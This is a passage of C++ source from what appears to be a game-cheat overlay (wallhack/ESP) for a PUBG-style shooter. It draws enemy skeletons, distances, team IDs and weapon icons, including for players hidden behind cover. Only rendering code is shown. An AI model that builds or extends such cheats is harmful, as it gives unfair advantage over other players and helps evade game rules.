												//DX11::ImGui_DX11::DrawLine(Chest.X, Chest.Y, Pelvis.X, Pelvis.Y, ImColor(Setting::botbonecoloropen[0], Setting::botbonecoloropen[1], Setting::botbonecoloropen[2], Setting::botbonecoloropen[3]), Setting::pbonesize);
												//DX11::ImGui_DX11::DrawLine(Chest.X, Chest.Y, lSholder.X, lSholder.Y, ImColor(Setting::botbonecoloropen[0], Setting::botbonecoloropen[1], Setting::botbonecoloropen[2], Setting::botbonecoloropen[3]), Setting::pbonesize);
												//DX11::ImGui_DX11::DrawLine(Chest.X, Chest.Y, rSholder.X, rSholder.Y, ImColor(Setting::botbonecoloropen[0], Setting::botbonecoloropen[1], Setting::botbonecoloropen[2], Setting::botbonecoloropen[3]), Setting::pbonesize);
												//DX11::ImGui_DX11::DrawLine(lSholder.X, lSholder.Y, lElbow.X, lElbow.Y, ImColor(Setting::botbonecoloropen[0], Setting::botbonecoloropen[1], Setting::botbonecoloropen[2], Setting::botbonecoloropen[3]), Setting::pbonesize);
												//DX11::ImGui_DX11::DrawLine(rSholder.X, rSholder.Y, rElbow.X, rElbow.Y, ImColor(Setting::botbonecoloropen[0], Setting::botbonecoloropen[1], Setting::botbonecoloropen[2], Setting::botbonecoloropen[3]), Setting::pbonesize);
												//DX11::ImGui_DX11::DrawLine(lElbow.X, lElbow.Y, lWrist.X, lWrist.Y, ImColor(Setting::botbonecoloropen[0], Setting::botbonecoloropen[1], Setting::botbonecoloropen[2], Setting::botbonecoloropen[3]), Setting::pbonesize);
												//DX11::ImGui_DX11::DrawLine(rElbow.X, rElbow.Y, rWrist.X, rWrist.Y, ImColor(Setting::botbonecoloropen[0], Setting::botbonecoloropen[1], Setting::botbonecoloropen[2], Setting::botbonecoloropen[3]), Setting::pbonesize);
												//DX11::ImGui_DX11::DrawLine(Pelvis.X, Pelvis.Y, lThigh.X, lThigh.Y, ImColor(Setting::botbonecoloropen[0], Setting::botbonecoloropen[1], Setting::botbonecoloropen[2], Setting::botbonecoloropen[3]), Setting::pbonesize);
												//DX11::ImGui_DX11::DrawLine(Pelvis.X, Pelvis.Y, rThigh.X, rThigh.Y, ImColor(Setting::botbonecoloropen[0], Setting::botbonecoloropen[1], Setting::botbonecoloropen[2], Setting::botbonecoloropen[3]), Setting::pbonesize);
												//DX11::ImGui_DX11::DrawLine(lThigh.X, lThigh.Y, lKnee.X, lKnee.Y, ImColor(Setting::botbonecoloropen[0], Setting::botbonecoloropen[1], Setting::botbonecoloropen[2], Setting::botbonecoloropen[3]), Setting::pbonesize);
												//DX11::ImGui_DX11::DrawLine(rThigh.X, rThigh.Y, rKnee.X, rKnee.Y, ImColor(Setting::botbonecoloropen[0], Setting::botbonecoloropen[1], Setting::botbonecoloropen[2], Setting::botbonecoloropen[3]), Setting::pbonesize);
												//DX11::ImGui_DX11::DrawLine(lKnee.X, lKnee.Y, lAnkle.X, lAnkle.Y, ImColor(Setting::botbonecoloropen[0], Setting::botbonecoloropen[1], Setting::botbonecoloropen[2], Setting::botbonecoloropen[3]), Setting::pbonesize);
												//DX11::ImGui_DX11::DrawLine(rKnee.X, rKnee.Y, rAnkle.X, rAnkle.Y, ImColor(Setting::botbonecoloropen[0], Setting::botbonecoloropen[1], Setting::botbonecoloropen[2], Setting::botbonecoloropen[3]), Setting::pbonesize);
											}
											else if (AActor.Visible == 0)
											{
												if (isnull(Head) && isnull(Chest) && isnull(LEFTSHOULDER) && isnull(RIGHTSHOULDER) && isnull(LEFTELBOWROLL) && isnull(RIGHTELBOWROLL) && isnull(Pelvis) && isnull(LEFTLEGS) && isnull(RIGHTLEGS) && isnull(LEFTKNEEROLL) && isnull(RIGHTKNEEROLL) && isnull(LEFTFOOT) && isnull(RIGHTFOOT) && isnull(LEFTHAND) && isnull(RIGHTHAND))
												{
													DX11::ImGui_DX11::DrawCircle(Head.X, Head.Y, Screen.Z / 12, DX11::ImGui_DX11::Color::Yellow, Setting::pbonesize);
													DX11::ImGui_DX11::DrawLine(Chest.X, Chest.Y, Pelvis.X, Pelvis.Y, ImColor(Setting::botbonecolorcover[0], Setting::botbonecolorcover[1], Setting::botbonecolorcover[2], Setting::botbonecolorcover[3]), Setting::pbonesize);

													DX11::ImGui_DX11::DrawLine(Chest.X, Chest.Y, LEFTSHOULDER.X, LEFTSHOULDER.Y, ImColor(Setting::botbonecolorcover[0], Setting::botbonecolorcover[1], Setting::botbonecolorcover[2], Setting::botbonecolorcover[3]), Setting::pbonesize);
													DX11::ImGui_DX11::DrawLine(Chest.X, Chest.Y, RIGHTSHOULDER.X, RIGHTSHOULDER.Y, ImColor(Setting::botbonecolorcover[0], Setting::botbonecolorcover[1], Setting::botbonecolorcover[2], Setting::botbonecolorcover[3]), Setting::pbonesize);

													DX11::ImGui_DX11::DrawLine(LEFTSHOULDER.X, LEFTSHOULDER.Y, LEFTELBOWROLL.X, LEFTELBOWROLL.Y, ImColor(Setting::botbonecolorcover[0], Setting::botbonecolorcover[1], Setting::botbonecolorcover[2], Setting::botbonecolorcover[3]), Setting::pbonesize);
													DX11::ImGui_DX11::DrawLine(RIGHTSHOULDER.X, RIGHTSHOULDER.Y, RIGHTELBOWROLL.X, RIGHTELBOWROLL.Y, ImColor(Setting::botbonecolorcover[0], Setting::botbonecolorcover[1], Setting::botbonecolorcover[2], Setting::botbonecolorcover[3]), Setting::pbonesize);

													DX11::ImGui_DX11::DrawLine(LEFTELBOWROLL.X, LEFTELBOWROLL.Y, LEFTHAND.X, LEFTHAND.Y, ImColor(Setting::botbonecolorcover[0], Setting::botbonecolorcover[1], Setting::botbonecolorcover[2], Setting::botbonecolorcover[3]), Setting::pbonesize);
													DX11::ImGui_DX11::DrawLine(RIGHTELBOWROLL.X, RIGHTELBOWROLL.Y, RIGHTHAND.X, RIGHTHAND.Y, ImColor(Setting::botbonecolorcover[0], Setting::botbonecolorcover[1], Setting::botbonecolorcover[2], Setting::botbonecolorcover[3]), Setting::pbonesize);

													DX11::ImGui_DX11::DrawLine(Pelvis.X, Pelvis.Y, LEFTLEGS.X, LEFTLEGS.Y, ImColor(Setting::botbonecolorcover[0], Setting::botbonecolorcover[1], Setting::botbonecolorcover[2], Setting::botbonecolorcover[3]), Setting::pbonesize);
													DX11::ImGui_DX11::DrawLine(Pelvis.X, Pelvis.Y, RIGHTLEGS.X, RIGHTLEGS.Y, ImColor(Setting::botbonecolorcover[0], Setting::botbonecolorcover[1], Setting::botbonecolorcover[2], Setting::botbonecolorcover[3]), Setting::pbonesize);

													DX11::ImGui_DX11::DrawLine(LEFTLEGS.X, LEFTLEGS.Y, LEFTKNEEROLL.X, LEFTKNEEROLL.Y, ImColor(Setting::botbonecolorcover[0], Setting::botbonecolorcover[1], Setting::botbonecolorcover[2], Setting::botbonecolorcover[3]), Setting::pbonesize);
													DX11::ImGui_DX11::DrawLine(RIGHTLEGS.X, RIGHTLEGS.Y, RIGHTKNEEROLL.X, RIGHTKNEEROLL.Y, ImColor(Setting::botbonecolorcover[0], Setting::botbonecolorcover[1], Setting::botbonecolorcover[2], Setting::botbonecolorcover[3]), Setting::pbonesize);

													DX11::ImGui_DX11::DrawLine(LEFTKNEEROLL.X, LEFTKNEEROLL.Y, LEFTFOOT.X, LEFTFOOT.Y, ImColor(Setting::botbonecolorcover[0], Setting::botbonecolorcover[1], Setting::botbonecolorcover[2], Setting::botbonecolorcover[3]), Setting::pbonesize);
													DX11::ImGui_DX11::DrawLine(RIGHTKNEEROLL.X, RIGHTKNEEROLL.Y, RIGHTFOOT.X, RIGHTFOOT.Y, ImColor(Setting::botbonecolorcover[0], Setting::botbonecolorcover[1], Setting::botbonecolorcover[2], Setting::botbonecolorcover[3]), Setting::pbonesize);
												}
											}
										}
										if (Setting::playerBoneColorVer == 1)
										{
											if (isnull(Head) && isnull(Chest) && isnull(LEFTSHOULDER) && isnull(RIGHTSHOULDER) && isnull(LEFTELBOWROLL) && isnull(RIGHTELBOWROLL) && isnull(Pelvis) && isnull(LEFTLEGS) && isnull(RIGHTLEGS) && isnull(LEFTKNEEROLL) && isnull(RIGHTKNEEROLL) && isnull(LEFTFOOT) && isnull(RIGHTFOOT) && isnull(LEFTHAND) && isnull(RIGHTHAND))
											{
												DX11::ImGui_DX11::DrawCircle(Head.X, Head.Y, Screen.Z / 12, DX11::ImGui_DX11::Color::Yellow, Setting::pbonesize);
												DX11::ImGui_DX11::DrawLine(Chest.X, Chest.Y, Pelvis.X, Pelvis.Y, ImColor(Setting::botbonecolor[0], Setting::botbonecolor[1], Setting::botbonecolor[2], Setting::botbonecolor[3]), Setting::pbonesize);

												DX11::ImGui_DX11::DrawLine(Chest.X, Chest.Y, LEFTSHOULDER.X, LEFTSHOULDER.Y, ImColor(Setting::botbonecolor[0], Setting::botbonecolor[1], Setting::botbonecolor[2], Setting::botbonecolor[3]), Setting::pbonesize);
												DX11::ImGui_DX11::DrawLine(Chest.X, Chest.Y, RIGHTSHOULDER.X, RIGHTSHOULDER.Y, ImColor(Setting::botbonecolor[0], Setting::botbonecolor[1], Setting::botbonecolor[2], Setting::botbonecolor[3]), Setting::pbonesize);

												DX11::ImGui_DX11::DrawLine(LEFTSHOULDER.X, LEFTSHOULDER.Y, LEFTELBOWROLL.X, LEFTELBOWROLL.Y, ImColor(Setting::botbonecolor[0], Setting::botbonecolor[1], Setting::botbonecolor[2], Setting::botbonecolor[3]), Setting::pbonesize);
												DX11::ImGui_DX11::DrawLine(RIGHTSHOULDER.X, RIGHTSHOULDER.Y, RIGHTELBOWROLL.X, RIGHTELBOWROLL.Y, ImColor(Setting::botbonecolor[0], Setting::botbonecolor[1], Setting::botbonecolor[2], Setting::botbonecolor[3]), Setting::pbonesize);

												DX11::ImGui_DX11::DrawLine(LEFTELBOWROLL.X, LEFTELBOWROLL.Y, LEFTHAND.X, LEFTHAND.Y, ImColor(Setting::botbonecolor[0], Setting::botbonecolor[1], Setting::botbonecolor[2], Setting::botbonecolor[3]), Setting::pbonesize);
												DX11::ImGui_DX11::DrawLine(RIGHTELBOWROLL.X, RIGHTELBOWROLL.Y, RIGHTHAND.X, RIGHTHAND.Y, ImColor(Setting::botbonecolor[0], Setting::botbonecolor[1], Setting::botbonecolor[2], Setting::botbonecolor[3]), Setting::pbonesize);

												DX11::ImGui_DX11::DrawLine(Pelvis.X, Pelvis.Y, LEFTLEGS.X, LEFTLEGS.Y, ImColor(Setting::botbonecolor[0], Setting::botbonecolor[1], Setting::botbonecolor[2], Setting::botbonecolor[3]), Setting::pbonesize);
												DX11::ImGui_DX11::DrawLine(Pelvis.X, Pelvis.Y, RIGHTLEGS.X, RIGHTLEGS.Y, ImColor(Setting::botbonecolor[0], Setting::botbonecolor[1], Setting::botbonecolor[2], Setting::botbonecolor[3]), Setting::pbonesize);

												DX11::ImGui_DX11::DrawLine(LEFTLEGS.X, LEFTLEGS.Y, LEFTKNEEROLL.X, LEFTKNEEROLL.Y, ImColor(Setting::botbonecolor[0], Setting::botbonecolor[1], Setting::botbonecolor[2], Setting::botbonecolor[3]), Setting::pbonesize);
												DX11::ImGui_DX11::DrawLine(RIGHTLEGS.X, RIGHTLEGS.Y, RIGHTKNEEROLL.X, RIGHTKNEEROLL.Y, ImColor(Setting::botbonecolor[0], Setting::botbonecolor[1], Setting::botbonecolor[2], Setting::botbonecolor[3]), Setting::pbonesize);

												DX11::ImGui_DX11::DrawLine(LEFTKNEEROLL.X, LEFTKNEEROLL.Y, LEFTFOOT.X, LEFTFOOT.Y, ImColor(Setting::botbonecolor[0], Setting::botbonecolor[1], Setting::botbonecolor[2], Setting::botbonecolor[3]), Setting::pbonesize);
												DX11::ImGui_DX11::DrawLine(RIGHTKNEEROLL.X, RIGHTKNEEROLL.Y, RIGHTFOOT.X, RIGHTFOOT.Y, ImColor(Setting::botbonecolor[0], Setting::botbonecolor[1], Setting::botbonecolor[2], Setting::botbonecolor[3]), Setting::pbonesize);
											}
										}
										else if (Setting::playerBoneColorVer == 2)
										{
											if (isnull(Head) && isnull(Chest) && isnull(LEFTSHOULDER) && isnull(RIGHTSHOULDER) && isnull(LEFTELBOWROLL) && isnull(RIGHTELBOWROLL) && isnull(Pelvis) && isnull(LEFTLEGS) && isnull(RIGHTLEGS) && isnull(LEFTKNEEROLL) && isnull(RIGHTKNEEROLL) && isnull(LEFTFOOT) && isnull(RIGHTFOOT) && isnull(LEFTHAND) && isnull(RIGHTHAND))
											{
												DX11::ImGui_DX11::DrawCircle(Head.X, Head.Y, Screen.Z / 12, DX11::ImGui_DX11::Color::Yellow, Setting::pbonesize);
												DX11::ImGui_DX11::DrawLine(Chest.X, Chest.Y, Pelvis.X, Pelvis.Y, linescolors, Setting::pbonesize);

												DX11::ImGui_DX11::DrawLine(Chest.X, Chest.Y, LEFTSHOULDER.X, LEFTSHOULDER.Y, linescolors, Setting::pbonesize);
												DX11::ImGui_DX11::DrawLine(Chest.X, Chest.Y, RIGHTSHOULDER.X, RIGHTSHOULDER.Y, linescolors, Setting::pbonesize);

												DX11::ImGui_DX11::DrawLine(LEFTSHOULDER.X, LEFTSHOULDER.Y, LEFTELBOWROLL.X, LEFTELBOWROLL.Y, linescolors, Setting::pbonesize);
												DX11::ImGui_DX11::DrawLine(RIGHTSHOULDER.X, RIGHTSHOULDER.Y, RIGHTELBOWROLL.X, RIGHTELBOWROLL.Y, linescolors, Setting::pbonesize);

												DX11::ImGui_DX11::DrawLine(LEFTELBOWROLL.X, LEFTELBOWROLL.Y, LEFTHAND.X, LEFTHAND.Y, linescolors, Setting::pbonesize);
												DX11::ImGui_DX11::DrawLine(RIGHTELBOWROLL.X, RIGHTELBOWROLL.Y, RIGHTHAND.X, RIGHTHAND.Y, linescolors, Setting::pbonesize);

												DX11::ImGui_DX11::DrawLine(Pelvis.X, Pelvis.Y, LEFTLEGS.X, LEFTLEGS.Y, linescolors, Setting::pbonesize);
												DX11::ImGui_DX11::DrawLine(Pelvis.X, Pelvis.Y, RIGHTLEGS.X, RIGHTLEGS.Y, linescolors, Setting::pbonesize);

												DX11::ImGui_DX11::DrawLine(LEFTLEGS.X, LEFTLEGS.Y, LEFTKNEEROLL.X, LEFTKNEEROLL.Y, linescolors, Setting::pbonesize);
												DX11::ImGui_DX11::DrawLine(RIGHTLEGS.X, RIGHTLEGS.Y, RIGHTKNEEROLL.X, RIGHTKNEEROLL.Y, linescolors, Setting::pbonesize);

												DX11::ImGui_DX11::DrawLine(LEFTKNEEROLL.X, LEFTKNEEROLL.Y, LEFTFOOT.X, LEFTFOOT.Y, linescolors, Setting::pbonesize);
												DX11::ImGui_DX11::DrawLine(RIGHTKNEEROLL.X, RIGHTKNEEROLL.Y, RIGHTFOOT.X, RIGHTFOOT.Y, linescolors, Setting::pbonesize);
											}
										}
									}





									if (Setting::plyrdistance)
									{
										if (Setting::EspStyle == 0)
										{
											DX11::ImGui_DX11::DrawBorderText(DX11::ImGui_DX11::pRegularFont, dissize, dist, Screen.X - 2, (Screen.Y + Screen.Z) + 15, ImColor(Setting::pdistancecolor[0], Setting::pdistancecolor[1], Setting::pdistancecolor[2], Setting::pdistancecolor[3]), true);
										}
										else if (Setting::EspStyle == 1 || Setting::EspStyle == 2 || Setting::EspStyle == 3)
										{
											DX11::ImGui_DX11::DrawBorderText(DX11::ImGui_DX11::pRegularFont, dissize, dist, Screen.X - 2, (Screen.Y + Screen.Z) + 5, ImColor(Setting::pdistancecolor[0], Setting::pdistancecolor[1], Setting::pdistancecolor[2], Setting::pdistancecolor[3]), true);
										}
									}
									if (Setting::pTeamID)
									{
										if (TeamIDStyle == 0)
										{
											if (Setting::EspStyle == 0)
											{
												if (AActor.Health <= 0)
												{
													DX11::ImGui_DX11::DrawStrokeText(DX11::ImGui_DX11::pRegularFont, Screen.X - 50, Screen.Y - 46, DX11::ImGui_DX11::Color::Red, TemID.c_str(), TeamIdSize, false);

												}
												else
												{
													DX11::ImGui_DX11::DrawStrokeText(DX11::ImGui_DX11::pRegularFont, Screen.X - 50, Screen.Y - 46, ImColor(Setting::PlayerTeamId[0], Setting::PlayerTeamId[1], Setting::PlayerTeamId[2], Setting::PlayerTeamId[3]), TemID.c_str(), TeamIdSize, false);

												}
											}
											else if (Setting::EspStyle == 1)
											{
												if (AActor.Health <= 0)
												{
													DX11::ImGui_DX11::DrawStrokeText(DX11::ImGui_DX11::pRegularFont, Screen.X - 60, Screen.Y - 46, DX11::ImGui_DX11::Color::Red, TemID.c_str(), TeamIdSize, false);

												}
												else
												{
													DX11::ImGui_DX11::DrawStrokeText(DX11::ImGui_DX11::pRegularFont, Screen.X - 60, Screen.Y - 46, ImColor(Setting::PlayerTeamId[0], Setting::PlayerTeamId[1], Setting::PlayerTeamId[2], Setting::PlayerTeamId[3]), TemID.c_str(), TeamIdSize, false);

												}
											}
											else if (Setting::EspStyle == 2)
											{
												if (AActor.Health <= 0)
												{
													DX11::ImGui_DX11::DrawStrokeText(DX11::ImGui_DX11::pRegularFont, Screen.X - 50, Screen.Y - 46, DX11::ImGui_DX11::Color::Red, TemID.c_str(), TeamIdSize, false);

												}
												else
												{
													DX11::ImGui_DX11::DrawStrokeText(DX11::ImGui_DX11::pRegularFont, Screen.X - 50, Screen.Y - 46, ImColor(Setting::PlayerTeamId[0], Setting::PlayerTeamId[1], Setting::PlayerTeamId[2], Setting::PlayerTeamId[3]), TemID.c_str(), TeamIdSize, false);

												}
											}
											else if (Setting::EspStyle == 3)
											{
												if (AActor.Health <= 0)
												{
													DX11::ImGui_DX11::DrawStrokeText(DX11::ImGui_DX11::pRegularFont, Screen.X - 50, Screen.Y - 46, DX11::ImGui_DX11::Color::Red, TemID.c_str(), TeamIdSize, false);

												}
												else
												{
													DX11::ImGui_DX11::DrawStrokeText(DX11::ImGui_DX11::pRegularFont, Screen.X - 50, Screen.Y - 46, ImColor(Setting::PlayerTeamId[0], Setting::PlayerTeamId[1], Setting::PlayerTeamId[2], Setting::PlayerTeamId[3]), TemID.c_str(), TeamIdSize, false);

												}
											}
										}
										else if (TeamIDStyle == 1)
										{
											if (Setting::EspStyle == 0)
											{
												if (AActor.Health <= 0)
												{
													DX11::ImGui_DX11::DrawStrokeText(DX11::ImGui_DX11::pRegularFont, Screen.X - 50, Screen.Y - 46, DX11::ImGui_DX11::Color::Red, TemID.c_str(), TeamIdSize, false);

												}
												else
												{
													DX11::ImGui_DX11::DrawStrokeText(DX11::ImGui_DX11::pRegularFont, Screen.X - 50, Screen.Y - 46, linescolors, TemID.c_str(), TeamIdSize, false);

												}
											}
											if (Setting::EspStyle == 1)
											{
												if (AActor.Health <= 0)
												{
													DX11::ImGui_DX11::DrawStrokeText(DX11::ImGui_DX11::pRegularFont, Screen.X - 50, Screen.Y - 46, DX11::ImGui_DX11::Color::Red, TemID.c_str(), TeamIdSize, false);

												}
												else
												{
													DX11::ImGui_DX11::DrawStrokeText(DX11::ImGui_DX11::pRegularFont, Screen.X - 50, Screen.Y - 46, linescolors, TemID.c_str(), TeamIdSize, false);

												}
											}
											else if (Setting::EspStyle == 2)
											{
												if (AActor.Health <= 0)
												{
													DX11::ImGui_DX11::DrawStrokeText(DX11::ImGui_DX11::pRegularFont, Screen.X - 50, Screen.Y - 46, DX11::ImGui_DX11::Color::Red, TemID.c_str(), TeamIdSize, false);

												}
												else
												{
													DX11::ImGui_DX11::DrawStrokeText(DX11::ImGui_DX11::pRegularFont, Screen.X - 50, Screen.Y - 46, linescolors, TemID.c_str(), TeamIdSize, false);

												}
											}
											else if (Setting::EspStyle == 3)
											{
												if (AActor.Health <= 0)
												{
													DX11::ImGui_DX11::DrawStrokeText(DX11::ImGui_DX11::pRegularFont, Screen.X - 50, Screen.Y - 46, DX11::ImGui_DX11::Color::Red, TemID.c_str(), TeamIdSize, false);

												}
												else
												{
													DX11::ImGui_DX11::DrawStrokeText(DX11::ImGui_DX11::pRegularFont, Screen.X - 50, Screen.Y - 46, linescolors, TemID.c_str(), TeamIdSize, false);

												}
											}
										}


									}
									if (Setting::playerweapon)
									{
										if (Setting::Lang == 0 || Setting::Lang == 2)
										{
											if (WeaponStyle == 0)
											{
												if (Setting::EspStyle == 0)
												{
													auto scope = "  " + AActor.ScopeFov;
													if (AActor.Weapon == "Fist")
													{
														Text = AActor.Weapon;
														DX11::ImGui_DX11::DrawBorderText(DX11::ImGui_DX11::pRegularFont, pweapsize, Text, Screen.X - 2, Screen.Y - 20, DX11::ImGui_DX11::Color::Green, true);
													}
													else
													{
														Text = AActor.Weapon + scope;
														DX11::ImGui_DX11::DrawBorderText(DX11::ImGui_DX11::pRegularFont, pweapsize, Text, Screen.X - 2, Screen.Y - 20, ImColor(Setting::weaponenemycolor[0], Setting::weaponenemycolor[1], Setting::weaponenemycolor[2], Setting::weaponenemycolor[3]), true);
													}
												}
												else if (Setting::EspStyle == 1)
												{
													auto scope = "  " + AActor.ScopeFov;
													if (AActor.Weapon == "Fist")
													{
														Text = AActor.Weapon;
														DX11::ImGui_DX11::DrawBorderText(DX11::ImGui_DX11::pRegularFont, pweapsize, Text, Screen.X - 2, Screen.Y - 45, DX11::ImGui_DX11::Color::Green, true);
													}
													else
													{
														Text = AActor.Weapon + scope;
														DX11::ImGui_DX11::DrawBorderText(DX11::ImGui_DX11::pRegularFont, pweapsize, Text, Screen.X - 2, Screen.Y - 45, ImColor(Setting::weaponenemycolor[0], Setting::weaponenemycolor[1], Setting::weaponenemycolor[2], Setting::weaponenemycolor[3]), true);
													}
												}
												else if (Setting::EspStyle == 2)
												{
													auto scope = "  " + AActor.ScopeFov;
													if (AActor.Weapon == "Fist")
													{
														Text = AActor.Weapon;
														DX11::ImGui_DX11::DrawBorderText(DX11::ImGui_DX11::pRegularFont, pweapsize, Text, Screen.X - 2, Screen.Y - 45, DX11::ImGui_DX11::Color::Green, true);
													}
													else
													{
														Text = AActor.Weapon + scope;
														DX11::ImGui_DX11::DrawBorderText(DX11::ImGui_DX11::pRegularFont, pweapsize, Text, Screen.X - 2, Screen.Y - 45, ImColor(Setting::weaponenemycolor[0], Setting::weaponenemycolor[1], Setting::weaponenemycolor[2], Setting::weaponenemycolor[3]), true);
													}
												}
												else if (Setting::EspStyle == 3)
												{
													auto scope = "  " + AActor.ScopeFov;
													if (AActor.Weapon == "Fist")
													{
														Text = AActor.Weapon;
														DX11::ImGui_DX11::DrawBorderText(DX11::ImGui_DX11::pRegularFont, pweapsize, Text, Screen.X - 2, Screen.Y - 45, DX11::ImGui_DX11::Color::Green, true);
													}
													else
													{
														Text = AActor.Weapon + scope;
														DX11::ImGui_DX11::DrawBorderText(DX11::ImGui_DX11::pRegularFont, pweapsize, Text, Screen.X - 2, Screen.Y - 45, ImColor(Setting::weaponenemycolor[0], Setting::weaponenemycolor[1], Setting::weaponenemycolor[2], Setting::weaponenemycolor[3]), true);
													}
												}
											}
											else if (WeaponStyle == 1)
											{
												if (Setting::EspStyle == 0)
												{
													string wep = AActor.Weapon;
													if (wep == "Fist")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand22, Screen.X - 30, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "AKM")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand24, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "ACE32")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand39, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "AUG")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand28, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "M24")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand7, Screen.X - 35, Screen.Y - 35, 80, 15);
														continue;
													}
													else if (wep == "Kar98k")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand1, Screen.X - 35, Screen.Y - 35, 80, 15);
														continue;
													}
													else if (wep == "AWM")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand23, Screen.X - 35, Screen.Y - 35, 80, 15);
														continue;
													}
													else if (wep == "Mosin")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand55, Screen.X - 35, Screen.Y - 35, 80, 15);
														continue;
													}
													else if (wep == "M762")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand15, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "FAMAS")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand57, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "M416")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand2, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "Honey Badger")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand42, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "P18C" || wep == "Vz61" || wep == "R1895")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand32, Screen.X, Screen.Y - 35, 30, 20);
														continue;
													}
													else if (wep == "Flaregun")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand46, Screen.X, Screen.Y - 35, 30, 20);
														continue;
													}
													else if (wep == "P1911")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand48, Screen.X, Screen.Y - 35, 30, 20);
														continue;
													}
													else if (wep == "R45")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand45, Screen.X, Screen.Y - 35, 30, 20);
														continue;
													}
													else if (wep == "P92")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand50, Screen.X, Screen.Y - 35, 30, 20);
														continue;
													}
													else if (wep == "DesertEagle")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand44, Screen.X, Screen.Y - 35, 30, 20);
														continue;
													}
													else if (wep == "QBU")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand26, Screen.X - 35, Screen.Y - 35, 80, 20);
														continue;
													}
													else if (wep == "SLR")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand14, Screen.X - 35, Screen.Y - 35, 80, 20);
														continue;
													}
													else if (wep == "SKS")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand13, Screen.X - 35, Screen.Y - 35, 80, 20);
														continue;
													}
													else if (wep == "Mini14")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand27, Screen.X - 35, Screen.Y - 35, 80, 20);
														continue;
													}
													else if (wep == "Mk14")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand4, Screen.X - 35, Screen.Y - 35, 80, 20);
														continue;
													}
													else if (wep == "VSS")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand17, Screen.X - 35, Screen.Y - 35, 80, 20);
														continue;
													}
													else if (wep == "Win94")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand33, Screen.X - 35, Screen.Y - 35, 80, 20);
														continue;
													}
													else if (wep == "MK12")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand49, Screen.X - 35, Screen.Y - 35, 80, 20);
														continue;
													}
													else if (wep == "SCAR-L")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand6, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "M16A4")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand3, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "Mk47")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand10, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "G36")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand29, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "QBZ")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand8, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "Groza")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand5, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "DP28")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand9, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "M249")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand25, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "MG3")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand43, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "P90")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand54, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "UMP9")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand18, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "PP19")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand30, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "Uzi")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand31, Screen.X - 35, Screen.Y - 35, 35, 20);
														continue;
													}
													else if (wep == "TommyGun")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand34, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "Vector")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand35, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "MP5K")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand51, Screen.X - 35, Screen.Y - 35, 50, 20);
														continue;
													}
													else if (wep == "SawedOff")
													{
														DX11::ImGui_DX11::DrawImage(DX11::Hand36, Screen.X - 35, Screen.Y - 35, 60, 20);
														continue;
													}
													else if (wep == "S1897")
													{
